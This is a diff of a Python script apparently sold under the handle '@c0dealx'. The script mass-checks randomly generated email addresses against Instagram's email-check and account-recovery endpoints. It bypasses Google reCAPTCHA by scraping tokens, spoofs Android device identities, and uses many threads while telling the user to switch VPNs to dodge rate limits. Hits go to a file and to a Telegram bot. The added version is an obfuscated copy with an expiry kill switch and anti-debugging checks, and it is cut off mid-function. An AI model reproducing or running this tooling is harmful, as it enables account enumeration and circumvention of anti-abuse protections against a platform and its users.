@@ -1,517 +1,322 @@
-import time
-from datetime import datetime
-import datetime
-import pytz
-end_datetime = datetime.datetime(2026, 6, 1)  
-iraq_timezone = pytz.timezone("Asia/Baghdad")
-
-remaining_time = end_datetime.astimezone(iraq_timezone) - datetime.datetime.now(iraq_timezone)
-print(f"[-] Remaining Time : {remaining_time}")
-
-if datetime.datetime.now(iraq_timezone) >= end_datetime.astimezone(iraq_timezone):
-    print("[!] Tool Expired contact @c0dealx ")
-    exit(0)
-import webbrowser
-import time
-
-# YouTube link open hoga
-webbrowser.open("https://youtu.be/IlCvtK5T8Ds?si=vHl0VN54XoMJRjuX")
-
-# Optional wait
-time.sleep(2)
-
-# Aage ka code
-print("Code running...")
-import requests
-import random
-import string
-import time
-import sys
-from cfonts import render
-from concurrent.futures import ThreadPoolExecutor, as_completed
-import httpx
-from colorama import Fore, Style, Back, init
-init()
-import os
-from threading import Thread, Lock
-from user_agent import generate_user_agent
-from hashlib import md5
-from bs4 import BeautifulSoup
-import base64
-import secrets
-from random import choice
-import subprocess
-import uuid
-import json
-import re
-from datetime import datetime
-
-
-try:
-    import h2
-except ImportError:
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "h2"])
-    import h2
-
-try:
-    import httpx
-except:
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "httpx", "httpx[http2]"])
-    import httpx
-
-try:
-    import pyfiglet
-    from rich.console import Console
-except ImportError:
-    os.system("pip install requests telethon pyfiglet rich cfonts")
-
-# ─── Color definitions ───
-b = random.randint(5, 208)
-bo = f'\x1b[38;5;{b}m'
-ED = '\x1b[38;5;208m'
-BLUE = '\033[94m'
-Z = '\033[1;31m'
-YELLOW = '\033[1;33m'
-O = '\033[2;31m'
-F = '\033[2;32m'
-A = '\033[2;34m'
-C = '\033[2;35m'
-M = '\033[2;36m'
-Y = '\033[1;34m'
-Z1 = '\033[2;31m'
-B = "\033[1;30m"
-R = "\033[1;31m"
-G = "\033[1;32m"
-Y = "\033[1;33m"
-Bl = "\033[1;34m"
-P = "\033[1;35m"
-C = "\033[1;36m"
-W = "\033[1;37m"
-X = '\033[1;33m'
-S = '\033[1;33m'
-J = '\033[2;36m'
-N = '\033[1;37m'
-U = '\x1b[1;37m'
-reset = "\033[0m"
-bold = "\033[1m"
-dim = "\033[2m"
-italic = "\033[3m"
-
-fg_lavender = "\033[38;5;183m"
-fg_mint = "\033[38;5;121m"
-fg_blue = "\033[38;5;75m"
-fg_red = "\033[38;5;196m"
-fg_pink = "\033[38;5;213m"
-fg_cyan = "\033[38;5;51m"
-fg_yellow = "\033[38;5;226m"
-fg_orange = "\033[38;5;208m"
-fg_white = "\033[38;5;255m"
-fg_green = "\033[38;5;82m"
-fg_gold = "\033[38;5;220m"
-fg_purple = "\033[38;5;141m"
-
-
-token = input("⌈━─━─━─≪ 𝑻𝑶𝑲𝑬𝑵 ≫─━─━─━⌉\n➤ ")
-print("\n")
-ID = input("⌈━─━─━─≪ 𝑰𝑫 ≫─━─━─━⌉\n➤ ")
-
-os.system("clear" if os.name == 'posix' else 'cls')
-
-used_usernames = set()
-lock = Lock()
-hit = 0
-badmail = 0
-badinsta = 0
-goodinsta = 0
-bad_user = 0
-fucked = 0
-good = 0
-taken = 0
-bad = 0
-limit = 0
-info_db = {}
-
-
-session = requests.Session()
-_session = requests.Session()
-
-
-def generate_android_ua():
-    devices = [
-        {"brand": "samsung", "model": "SM-G973F", "device": "beyond1", "board": "exynos9820", "cpu": "exynos9820"},
-        {"brand": "samsung", "model": "SM-A536B", "device": "a53x", "board": "s5e8825", "cpu": "exynos1280"},
-        {"brand": "samsung", "model": "SM-S918B", "device": "dm1q", "board": "kalama", "cpu": "qcom"},
-        {"brand": "Google", "model": "Pixel 6", "device": "raven", "board": "raven", "cpu": "gs101"},
-        {"brand": "Google", "model": "Pixel 7", "device": "panther", "board": "panther", "cpu": "gs201"},
-        {"brand": "Xiaomi", "model": "M2102J20SG", "device": "ares", "board": "mt6893", "cpu": "mtk"},
-        {"brand": "Xiaomi", "model": "Redmi Note 10", "device": "sweet", "board": "sm6150", "cpu": "qcom"},
-        {"brand": "OnePlus", "model": "ONEPLUS A6003", "device": "OnePlus6", "board": "sdm845", "cpu": "qcom"},
-        {"brand": "OPPO", "model": "CPH2371", "device": "OP4F1F", "board": "mt6893", "cpu": "mtk"},
-        {"brand": "HUAWEI", "model": "ELE-L29", "device": "HWELE", "board": "kirin980", "cpu": "hisilicon"},
-    ]
-    device = random.choice(devices)
-    android_version = random.choice(["10", "11", "12", "13", "14"])
-    api_level = {"10": "29", "11": "30", "12": "31", "13": "33", "14": "34"}[android_version]
-    dpi = random.choice(["320", "360", "394", "411", "420", "440", "450", "480"])
-    width = random.choice(["720", "1080", "1440"])
-    height = random.choice(["1520", "1600", "2280", "2340", "2400", "2560", "3200"])
-    instagram_ver = f"{random.randint(280, 340)}.0.0.{random.randint(10, 40)}.{random.randint(80, 150)}"
-    locale = random.choice(["en_US", "en_GB", "ar_SA"])
-    random_num = random.randint(300000000, 400000000)
-    ua = (f"Instagram {instagram_ver} Android ({api_level}/{android_version}; "
-          f"{dpi}dpi; {width}x{height}; {device['brand']}; {device['model']}; "
-          f"{device['device']}; {device['board']}; {locale}; {random_num})")
-    return ua
-
-
-def gen_jazoest():
-    return str(random.randint(10000, 99999))
-
-def gen_session_id():
-    part1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
-    part2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
-    return f"{part1}:{part2}:{random.randint(100,999)}"
-
-def gen_device_id():
-    return "android-" + secrets.token_hex(8)
-
-def gen_uuid():
-    return str(uuid.uuid4())
-
-def gen_mid():
-    return base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('=')
-
-
-def display():
-    stats = (
-        f"\r"
-        f"{fg_gold}{bold}╭━━━〔 ✦ 𝐋𝐈𝐕𝐄 𝐒𝐓𝐀𝐓𝐒 ✦ 〕━━━╮{reset}\n"
-        f"{fg_lavender}{bold}┃ ✦ 𝐇𝐈𝐓𝐒        ➤ {reset}{fg_white}{hit}{reset}\n"
-        f"{fg_green}{bold}┃ ✦ 𝐆𝐎𝐎𝐃        ➤ {reset}{fg_white}{good}{reset}\n"
-        f"{fg_red}{bold}┃ ✦ 𝐁𝐀𝐃         ➤ {reset}{fg_white}{bad}{reset}\n"
-        f"{fg_blue}{bold}┃ ✦ 𝐓𝐀𝐊𝐄𝐍       ➤ {reset}{fg_white}{taken}{reset}\n"
-        f"{fg_mint}{bold}┃ ✦ 𝐁𝐀𝐃𝐌𝐀𝐈𝐋    ➤ {reset}{fg_white}{badmail}{reset}\n"
-        f"{fg_gold}{bold}╰━━━〔 ✦ 𝐀𝐋𝐄𝐗 𝐏𝐀𝐍𝐄𝐋 ✦ 〕━━━╯{reset}"
-        f"{' ' * 10}"
-    )
-    sys.stdout.write(stats)
-    sys.stdout.flush()
-
-
-def send_telegram(msg):
-    try:
-        requests.get(
-            f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={msg}",
-            timeout=15
-        )
-    except:
-        pass
-
-
-def write_hit(msg):
-    with open('pookie.txt', 'a') as ff:
-        ff.write(f'{msg}\n')
-
-
-def solve_recaptcha_hi2():
-    try:
-        anchor_url = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=en&v=XrIDux0s7SoNe6_IHkjGC92W&size=invisible"
-        params = anchor_url.split('?')[1]
-        r = requests.get(f'https://www.google.com/recaptcha/enterprise/anchor?{params}', timeout=10)
-        recaptcha_token = r.text.split('recaptcha-token" value="')[1].split('"')[0]
-        payload = f"v={params.split('v=')[1].split('&')[0]}&reason=q&c={recaptcha_token}&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=en&size=invisible"
-        headers = {
-            "User-Agent": "Mozilla/5.0",
-            "Referer": f"https://www.google.com/recaptcha/enterprise/anchor?{params}",
-            "Content-Type": "application/x-www-form-urlencoded"
-        }
-        resp = requests.post('https://www.google.com/recaptcha/enterprise/reload', data=payload, headers=headers)
-        return resp.text.split('resp","')[1].split('"')[0]
-    except:
-        return None
-
-def check_hi2_registration(email):
-    """Check via hi2.in if email is already registered on Instagram"""
-    global badmail
-    if "@" in email:
-        domain = email.split("@")[1]
-        prefix = email.split("@")[0]
-    else:
-        return None
-
-    solve = solve_recaptcha_hi2()
-    if not solve:
-        return None
-
-    data = {
-        'domain': domain,
-        'prefix': prefix,
-        'recaptcha': solve,
-    }
-    headers = {
-        'User-Agent': "Mozilla/5.0",
-        'Accept': "application/json, text/plain, */*",
-        'authorization': "Basic bnVsbA==",
-    }
-    try:
-        response = requests.post("https://hi2.in/api/custom", data=data, headers=headers, timeout=15)
-        res = response.json()
-        if "already taken" in str(res):
-            badmail += 1
-            display()
-            return True
-        else:
-            return False
-    except:
-        return None
-
-
-def get_masked_email(query):
-    url = "https://www.instagram.com/api/graphql"
-    payload = {
-        'av': "0",
-        '__d': "www",
-        '__user': "0",
-        '__a': "1",
-        '__req': "f",
-        '__hs': "20563.HYP:instagram_web_pkg.2.1...0",
-        'dpr': "3",
-        '__ccg': "GOOD",
-        '__rev': "1037676804",
-        '__s': "nz2w5z:1vm2xs:94sap8",
-        '__hsi': "7630740602831122681",
-        '__dyn': "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwnU6a3a1YwBgao6C0Mo2swlo5q4U2zxe2GewGw9a361qw8Xwn8e87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK10xKi2K7E5y2-1mwa6byohw5ywuU1FU",
-        '__csr': "hcfEI9NcRh48hnvNdsyaD6RnvOldSySDHBpKBLAF6ypAEzC4-ILahjF6S_ui-np4bmqhfR8gCaWFOmjgyiLt9EJ8FeiiGjFeaUO5XyjkBKUhByUGuhddpufW8yZeXx6aCxVxSaz8ycFbxVacxDCx2q8wwG8wHypp9UOawPADz8yaAgO9yVHwiqz89EhwCw05Cuw2eE1ooCU0gByU6IE1gUqU1ao0Vdw2tFnw1ud06Ca0M8fEx2UN7y4bEM3wo1JU2RwSyaOcayU6d7gy0A-9wi6320Ho0N60W8S02VS09vw0lWo",
-        '__hsdp': "gSw8N0I1apBoBrysxGCA9cxkImy-u547Fu1lg13o6u8xy458eQ2Smm50y4FEC2Gce4mE64M09g80n9w6QG09SwjE0iCw5Nw",
-        '__hblp': "05twAU5q0gum1MwuU24xS6FU98Sq0E8e88Uowda0Ek0S9U1hE0igwmuq6rwa608Gw4BwaK0BUhw9SfwXUcE34w2iE4W09iweK2O0jG1rx-8wZwaW0iq3u",
-        '__sjsp': "gSw8N0I1apBoBrysxGCA8yElaxibVUkg9e0mi1Dy8ox1i3J0JBBxg8xaq9wTe",
-        '__comet_req': "7",
-        'lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8",
-        'jazoest': "22394",
-        '__spin_r': "1037676804",
-        '__spin_b': "trunk",
-        '__spin_t': "1776670246",
-        '__crn': "comet.igweb.PolarisCAAIGAccountRecoverySearchRoute",
-        'qpl_active_flow_ids': "516759801",
-        'fb_api_caller_class': "RelayModern",
-        'fb_api_req_friendly_name': "CAAIGAccountSearchViewQuery",
-        'server_timestamps': "true",
-        'variables': '{"params":{"event_request_id":"' + str(uuid.uuid4()) + '","next_uri":"","search_query":"' + query + '","waterfall_id":"' + str(uuid.uuid4()) + '"}}',
-        'doc_id': "26178667145161478",
-        'fb_api_analytics_tags': '["qpl_active_flow_ids=516759801"]'
-    }
-    headers = {
-        'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
-        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-        'sec-ch-ua-model': '""',
-        'x-ig-app-id': "936619743392459",
-        'x-ig-max-touch-points': "5",
-        'sec-ch-ua-mobile': "?0",
-        'x-fb-friendly-name': "CAAIGAccountSearchViewQuery",
-        'x-fb-lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8",
-        'sec-ch-ua-platform-version': '""',
-        'x-asbd-id': "359341",
-        'sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
-        'sec-ch-prefers-color-scheme': "dark",
-        'x-csrftoken': "o_6jxh33ZvsQ2eFMyRaM_q",
-        'sec-ch-ua-platform': '"Linux"',
-        'origin': "https://www.instagram.com",
-        'sec-fetch-site': "same-origin",
-        'sec-fetch-mode': "cors",
-        'sec-fetch-desc': "empty",
-        'referer': "https://www.instagram.com/accounts/password/reset/",
-        'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-        'Cookie': "csrftoken=o_6jxh33ZvsQ2eFMyRaM_q; datr=YMnlaTJAraHY5ADdYH8UqsTG; ig_did=2046A480-DF50-4660-A5CD-DC58F57C7A1C; mid=aeXJYAABAAGoDWzGwrGALDqzE3Np; dpr=3.558248996734619; wd=774x749"
-    }
-    try:
-        response = requests.post(url, data=payload, headers=headers, timeout=20)
-        data = response.json()
-        for cp in data.get("data", {}).get("caa_ar_ig_account_search", {}).get("contact_points", []):
-            if cp.get("type") == "EMAIL":
-                return cp.get("contact_point")
-        return None
-    except:
-        return None
-
-
-def rest(email):
-    global hit, badmail, badinsta, good, bad, goodinsta
-    try:
-        os.system('clear' if os.name == 'posix' else 'cls')
-        tt = (f'''
-{YELLOW}╭═━──────༺𓆩✧𓆪༻──────━═╮{reset}
-
-{YELLOW}┃{F} 𝑯𝑰𝑻𝑺        ➤ {hit}
-{YELLOW}┃{YELLOW} 𝑩𝑨𝑫         ➤ {badmail}
-{YELLOW}┃{ED} 𝑼𝑺𝑬𝑹        ➤ {email}
-{YELLOW}┃{R} 𝑮𝑶𝑶𝑫        ➤ {goodinsta}
-
-{YELLOW}╰═━──────༺𓆩✧𓆪༻──────━═╯{reset}
-        ''')
-        print(tt)
-
-        android_ua = generate_android_ua()
-
-
-        url = "https://i.instagram.com/api/v1/users/check_email/"
-        response = httpx.Client(http2=True).post(
-            url,
-            data=f"email={email}",
-            headers={
-                'User-Agent': "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)",
-                'content-type': "application/x-www-form-urlencoded; charset=UTF-8"
-            }
-        )
-
-        if 'email_is_taken' in response.text:
-
-            registered = check_hi2_registration(email)
-            if registered is True:
-                status = "ALREADY REGISTERED"
-            elif registered is False:
-                status = "NOT REGISTERED"
-            else:
-                status = "UNKNOWN"
-
-
-            api_session_id = gen_session_id()
-
-
-            masked_email = get_masked_email(email)
-            if not masked_email:
-                masked_email = "None"
-
-            hit += 1
-            good += 1
-            goodinsta += 1
-            dom = email.split("@")[1]
-
-            msg = f'''
-⌈━─━─━─≪ 𝑨 𝑳 𝑬 𝑿 x PT7 ≫─━─━─━⌉
-
-〔 {dom} 〕
-
-✦ 𝑬𝒎𝒂𝒊𝒍 ➤ {email}
-✦ 𝑺𝑻𝑨𝑻𝑼𝑺 ➤ {status}
-✦ 𝑴𝒂𝒔𝒌𝒆𝒅 ➤ {masked_email}
-✦ 𝑨𝑷𝑰 𝑺𝒆𝒔𝒔𝒊𝒐𝒏 ➤ {api_session_id}
-
-⌊━─━─━─≪ 𝑨 𝑳 𝑬 𝑿 x Pt7 ≫─━─━─━⌋
-'''
-            write_hit(msg)
-            send_telegram(msg)
-            display()
-        else:
-            bad += 1
-            badinsta += 1
-            display()
-
-    except Exception as e:
-        bad += 1
-        display()
-
-
-def lookup_bloks(email):
-    global good, bad, limit
-    url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
-    device = str(uuid.uuid4())
-    family = str(uuid.uuid4())
-    android = "android-" + secrets.token_hex(8)
-    payload = {
-        'params': '{"client_input_params":{"aac":"{\\"aac_init_timestamp\\":' + str(int(time.time())) + ',\\"aacjid\\":\\"' + str(uuid.uuid4()) + '\\",\\"aaccs\\":\\"' + secrets.token_urlsafe(32) + '\\"}","flash_call_permissions_status":{"READ_PHONE_STATE":"PERMANENTLY_DENIED","READ_CALL_LOG":"DENIED","ANSWER_PHONE_CALLS":"DENIED"},"was_headers_prefill_available":0,"network_bssid":null,"sfdid":"","fetched_email_token_list":{},"search_query":"' + email + '","auth_secure_device_id":"","ig_oauth_token":[],"cloud_trust_token":null,"was_headers_prefill_used":0,"sso_accounts_auth_data":[],"encrypted_msisdn":"","device_network_info":null,"text_input_id":"akyuf0:61","zero_balance_state":null,"android_build_type":"release","accounts_list":[],"is_oauth_without_permission":0,"ig_android_qe_device_id":"' + device + '","gms_incoming_call_retriever_eligibility":"client_not_supported","search_screen_type":"email_or_username","is_whatsapp_installed":1,"lois_settings":{"lois_token":""},"ig_vetted_device_nonce":null,"headers_infra_flow_id":"","fetched_email_list":[]},"server_params":{"event_request_id":"' + str(uuid.uuid4()) + '","is_from_logged_out":0,"layered_homepage_experiment_group":null,"device_id":"' + android + '","login_surface":"login_home","waterfall_id":"' + str(uuid.uuid4()) + '","INTERNAL__latency_qpl_instance_id":6.3987980400102E13,"is_platform_login":0,"context_data":"","login_entry_point":"logged_out","INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"' + family + '","offline_experiment_group":"caa_iteration_v3_perf_ig_4","access_flow_version":"pre_mt_behavior","is_from_logged_in_switcher":0,"qe_device_id":"' + device + '"}}',
-        'bk_client_context': '{"bloks_version":"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b","styles_id":"instagram"}',
-        'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
-    }
-    headers = {
-        'User-Agent': "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
-        'accept-language': "en-IN, en-US",
-        'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
-        'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
-        'x-ig-android-id': android,
-        'x-ig-app-id': "567067343352427",
-        'x-ig-app-locale': "en_IN",
-        'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
-        'x-ig-device-id': device,
-        'x-ig-family-device-id': family,
-        'x-ig-timezone-offset': str(datetime.now().astimezone().utcoffset().total_seconds()),
-        'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
-        'x-pigeon-rawclienttime': str(time.time()),
-        'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
-    }
-    try:
-        response = requests.post(url, data=payload, headers=headers, timeout=20)
-        if f"{email}" in response.text:
-            good += 1
-            display()
-
-            registered = check_hi2_registration(email)
-            status = "ALREADY REGISTERED" if registered else "NOT REGISTERED" if registered is False else "UNKNOWN"
-            api_session_id = gen_session_id()
-            masked_email = get_masked_email(email) or "None"
-
-            dom = email.split("@")[1]
-            msg = f'''
-⌈━─━─━─≪ 𝑨 𝑳 𝑬 𝑿 x Pt7 ≫─━─━─━⌉
-
-〔 {dom} 〕
-
-✦ 𝑬𝒎𝒂𝒊𝒍 ➤ {email}
-✦ 𝑺𝑻𝑨𝑻𝑼𝑺 ➤ {status}
-✦ 𝑴𝒂𝒔𝒌𝒆𝒅 ➤ {masked_email}
-✦ 𝑨𝑷𝑰 𝑺𝒆𝒔𝒔𝒊𝒐𝒏 ➤ {api_session_id}
-
-⌊━─━─━─≪ 𝑨 𝑳 𝑬 𝑿 x Pt7 ≫─━─━─━⌋
-'''
-            write_hit(msg)
-            send_telegram(msg)
-            hit += 1
-        elif 'Fucked up babes' in response.text:
-            limit += 1
-            display()
-        else:
-            bad += 1
-            display()
-    except:
-        bad += 1
-        display()
-
-
-def POOKIE_ALEX():
-    while True:
-        user1 = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
-        user2 = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
-        chosen_user = random.choice([user1, user2])
-
-        with lock:
-            if chosen_user in used_usernames:
-                continue
-            used_usernames.add(chosen_user)
-
-        chos = random.choice(["@hi2.in", "@telegmail.com"])
-        email = chosen_user + chos
-
-
-        try:
-            rest(email)
-        except:
-            try:
-                lookup_bloks(email)
-            except:
-                pass
-
-
-print(f"{fg_red}{bold}𖤐 𝗣𝗟𝗘𝗔𝗦𝗘 𝗧𝗢𝗚𝗚𝗟𝗘 𝗔𝗜𝗥𝗣𝗟𝗔𝗡𝗘 𝗠𝗢𝗗𝗘 𝗢𝗥 𝗖𝗛𝗔𝗡𝗚𝗘 𝗩𝗣𝗡 𝗦𝗘𝗥𝗩𝗘𝗥 𝗪𝗛𝗜𝗟𝗘 𝗥𝗨𝗡𝗡𝗜𝗡𝗚 𝗦𝗖𝗥𝗜𝗣𝗧 𖤐{reset}")
-time.sleep(2)
-
-print(f"\n{fg_gold}{bold}[*] Starting with 10 threads...{reset}\n")
-
-for _ in range(80):
-    Thread(target=POOKIE_ALEX, daemon=True).start()
-
-
-try:
-    while True:
-        time.sleep(60)
-except KeyboardInterrupt:
-    print(f"\n{fg_red}{bold}[!] BYEE BYEE..{reset}")
-    sys.exit(0)
+U=KeyboardInterrupt
+V=range
+N=open
+M=Exception
+K=input
+C=print
+import sys as F,os as B,signal as D,threading as G,hashlib as c,tempfile as d,inspect
+from datetime import datetime as E
+e=None
+f='__main__'
+g='2026-06-1'
+O=E.now
+P=B.kill
+W=D.signal
+h=F.exit
+Q=B._exit
+def i(func):
+	__cf_state__=0
+	while True:
+		if __cf_state__==0:__cf_state__=1
+		if __cf_state__==1:
+			try:func.__dict__={}
+			except:pass
+			__cf_state__=2
+		if __cf_state__==2:break
+for j in[O,P,W,h,Q]:i(j)
+def k():
+	__cf_state__=0
+	while True:
+		if __cf_state__==0:__cf_state__=1
+		if __cf_state__==1:__cf_state__=1 if F.gettrace()is not None or F.getprofile()is not None else 2;__cf_state__=2
+		if __cf_state__==2:return False
+		if __cf_state__==3:break
+def l():
+	__cf_state__=0
+	while True:
+		if __cf_state__==0:__cf_state__=1
+		if __cf_state__==1:
+			try:
+				with N(__file__,'rb')as A:return c.sha256(A.read()).hexdigest()
+			except:return
+			__cf_state__=2
+		if __cf_state__==2:break
+m=l()
+def n():
+	__cf_state__=0
+	while True:
+		if __cf_state__==0:__cf_state__=1
+		if __cf_state__==1:__cf_state__=3 if m is not None else 4;__cf_state__=2
+		if __cf_state__==2:return True
+		if __cf_state__==3:break
+def o():
+	__cf_state__=0
+	while True:
+		if __cf_state__==0:__cf_state__=1
+		if __cf_state__==1:
+			try:
+				import urllib.request
+				with urllib.request.urlopen('http://worldtimeapi.org/api/timezone/Etc/UTC',timeout=2)as A:B=A.read().decode();import json;C=json.loads(B)['datetime'];return E.strptime(C[:19],'%Y-%m-%dT%H:%M:%S').date()
+			except:return O().date()
+			__cf_state__=2
+		if __cf_state__==2:break
+def p(expiry_date_str):
+	__cf_state__=0
+	while True:
+		if __cf_state__==0:__cf_state__=1
+		if __cf_state__==1:G=E.strptime(expiry_date_str,'%Y-%m-%d').date();A=o();F=B.path.join(d.gettempdir(),'.expiry_token_secure');__cf_state__=2
+		if __cf_state__==2:
+			try:
+				with N(F,'r')as D:
+					H=D.read().strip();I=E.strptime(H,'%Y-%m-%d').date()
+					if I>A:C('Contact : @𝒄0𝒅𝒆𝒂𝒍𝒙');return True
+			except:pass
+			__cf_state__=3
+		if __cf_state__==3:
+			with N(F,'w')as D:D.write(A.strftime('%Y-%m-%d'))
+			__cf_state__=4
+		if __cf_state__==4:return A>G
+		if __cf_state__==5:break
+X=False
+def q(expiry_date_str):
+	__cf_state__=0
+	while True:
+		if __cf_state__==0:__cf_state__=1
+		if __cf_state__==1:global X;__cf_state__=2
+		if __cf_state__==2:__cf_state__=7 if not X else 8;__cf_state__=3
+		if __cf_state__==3:break
+def r(expiry_date_str):
+	A=expiry_date_str;__cf_state__=0
+	while True:
+		if __cf_state__==0:__cf_state__=1
+		if __cf_state__==1:
+			try:
+				for H in V(1,D.NSIG):
+					if H not in(D.SIGKILL,D.SIGSTOP):
+						try:W(H,D.SIG_DFL)
+						except:pass
+				J=G.Thread(target=q,args=(A,),daemon=True);J.start()
+				if k():raise M('Contact : @𝒄0𝒅𝒆𝒂𝒍𝒙')
+				if not n():raise M('Contact : @𝒄0𝒅𝒆𝒂𝒍𝒙')
+				if p(A):
+					C('Contact : @𝒄0𝒅𝒆𝒂𝒍𝒙');I=E.strptime(A,'%Y-%m-%d').date();K('');L=B.getpid()
+					try:P(L,D.SIGKILL)
+					except:pass
+					Q(1);F.exit(0);B.kill(929,9);F.exit(772);exit(685);B._exit(881);exit(324)
+				else:I=E.strptime(A,'%Y-%m-%d').date();N=O().date();S=(I-N).days;return e
+			except M as R:C(f"Error checking expiry: {R}");P(B.getpid(),D.SIGKILL);Q(1)
+			__cf_state__=2
+		if __cf_state__==2:break
+if __name__==f:r(g)
+import os as B,sys as F,time as L,json as Y,random as s,string as t,threading as G
+from datetime import datetime as E,timedelta as u,timezone
+try:from colorama import Fore,Style,init;init(autoreset=True)
+except ImportError:B.system('pip install colorama');from colorama import Fore,Style,init;init(autoreset=True)
+import requests as H
+R='\x1b[1m\x1b[31m'
+S='\x1b[1m\x1b[32m'
+I='\x1b[1m\x1b[33m'
+A2='\x1b[1m\x1b[34m'
+T='\x1b[1m\x1b[36m'
+A3='\x1b[1m\x1b[35m'
+A4='\x1b[1m\x1b[37m'
+A='\x1b[0m'
+A5='system_config.json'
+A6=t.ascii_lowercase
+A7=6
+Z=['https://t.me/alexwithcodes/171']
+v={'@hi2.in':'output_hi2.txt','@telegmail.com':'output_telegmail.txt','mixed':'output_mixed.txt'}
+a={'1':{'name':'hi2.in','domain':'@hi2.in','type':'single'},'2':{'name':'telegmail.com','domain':'@telegmail.com','type':'single'},'3':{'name':'MIXED MODE','domain':'mixed','type':'mixed'}}
+w=['@hi2.in','@telegmail.com']
+A8=u(hours=5,minutes=30)
+class x:
+	def __init__(A):
+		__cf_state__=0
+		while True:
+			if __cf_state__==0:__cf_state__=1
+			if __cf_state__==1:A.success=0;A.failed_fb=0;A.failed_mail=0;A.error=0;A.total=0;A.speed=0;A.lock=G.Lock();A.temp_counter=0;A.last_time=L.time();A.start_moment=None;A.current_target='';__cf_state__=2
+			if __cf_state__==2:break
+	def add_success(A):
+		__cf_state__=0
+		while True:
+			if __cf_state__==0:__cf_state__=1
+			if __cf_state__==1:
+				with A.lock:A.success+=1;A.total+=1;A.temp_counter+=1
+				__cf_state__=2
+			if __cf_state__==2:break
+	def add_failed_fb(A):
+		__cf_state__=0
+		while True:
+			if __cf_state__==0:__cf_state__=1
+			if __cf_state__==1:
+				with A.lock:A.failed_fb+=1;A.total+=1;A.temp_counter+=1
+				__cf_state__=2
+			if __cf_state__==2:break
+	def add_failed_mail(A):
+		__cf_state__=0
+		while True:
+			if __cf_state__==0:__cf_state__=1
+			if __cf_state__==1:
+				with A.lock:A.failed_mail+=1;A.total+=1;A.temp_counter+=1
+				__cf_state__=2
+			if __cf_state__==2:break
+	def add_error(A):
+		__cf_state__=0
+		while True:
+			if __cf_state__==0:__cf_state__=1
+			if __cf_state__==1:
+				with A.lock:A.error+=1;A.total+=1;A.temp_counter+=1
+				__cf_state__=2
+			if __cf_state__==2:break
+	def update_speed(A):
+		__cf_state__=0
+		while True:
+			if __cf_state__==0:__cf_state__=1
+			if __cf_state__==1:
+				with A.lock:
+					B=L.time();C=B-A.last_time
+					if C>0:A.speed=A.temp_counter/C;A.temp_counter=0
+					A.last_time=B
+				__cf_state__=2
+			if __cf_state__==2:break
+	def get_all(A):
+		__cf_state__=0
+		while True:
+			if __cf_state__==0:__cf_state__=1
+			if __cf_state__==1:
+				with A.lock:return{'hit':A.success,'bad':A.failed_fb,'bad_mail':A.failed_mail,'err':A.error,'tot':A.total,'rps':A.speed,'email':A.current_target}
+				__cf_state__=2
+			if __cf_state__==2:break
+class y:
+	def __init__(A,bot_key,chat_id,counter):
+		__cf_state__=0
+		while True:
+			if __cf_state__==0:__cf_state__=1
+			if __cf_state__==1:A.bot_key=bot_key;A.chat_id=chat_id;A.counter=counter;A.used_names=set();A.name_lock=G.Lock();A.video_pos=0;A.video_lock=G.Lock();__cf_state__=2
+			if __cf_state__==2:break
+	def get_captcha(J):
+		__cf_state__=0
+		while True:
+			if __cf_state__==0:__cf_state__=1
+			if __cf_state__==1:
+				try:B='https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=en&v=XrIDux0s7SoNe6_IHkjGC92W&size=invisible';A=B.split('?')[1];C=H.get(f"https://www.google.com/recaptcha/enterprise/anchor?{A}",timeout=10);D=C.text.split('recaptcha-token" value="')[1].split('"')[0];E=A.split('v=')[1].split('&')[0];F={'v':E,'reason':'q','c':D,'k':'6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct','co':'aHR0cHM6Ly9oaTIuaW46NDQz','hl':'en','size':'invisible'};G={'User-Agent':'Mozilla/5.0','Referer':f"https://www.google.com/recaptcha/enterprise/anchor?{A}",'Content-Type':'application/x-www-form-urlencoded'};I=H.post('https://www.google.com/recaptcha/enterprise/reload',data=F,headers=G,timeout=10);return I.text.split('resp","')[1].split('"')[0]
+				except:return
